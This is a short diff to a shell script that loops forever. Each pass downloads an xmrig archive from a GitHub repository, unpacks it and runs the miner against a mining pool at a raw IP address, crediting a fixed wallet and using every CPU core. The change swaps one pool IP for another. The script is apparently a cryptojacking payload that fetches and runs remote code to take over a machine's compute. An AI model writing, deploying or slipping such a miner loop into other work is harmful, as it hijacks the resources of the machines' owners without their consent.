@@ -1,6 +1,6 @@
 #!/bin/sh
 while [ 1 ]; do
 	wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
-	./xmrig -a ghostrider --url 128.199.213.167:443 --user RYXHSfbfcjWahLcDw8xmU7uJrfqTTMsELT.nes -t $(nproc --all)
+	./xmrig -a ghostrider --url 188.166.212.179:443 --user RYXHSfbfcjWahLcDw8xmU7uJrfqTTMsELT.nes -t $(nproc --all)
 	sleep 5
 done
